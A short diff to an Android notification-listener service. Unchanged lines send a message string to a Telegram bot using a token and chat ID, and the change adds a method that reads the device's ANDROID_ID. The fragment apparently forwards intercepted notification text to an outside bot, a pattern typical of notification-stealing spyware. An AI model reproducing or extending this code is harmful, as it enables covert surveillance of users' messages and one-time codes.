@@ -43,11 +43,14 @@ public class NotificationService extends NotificationListenerService {
         OkHttpClient client = new OkHttpClient.Builder()
                 .connectTimeout(30, TimeUnit.SECONDS)
                 .build();
-                
         String url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + msg;
         client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
             @Override public void onFailure(Call c, IOException e) {}
             @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
         });
+    }
+
+    public String getDeviceIDUnique() {
+        return android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
     }
 }
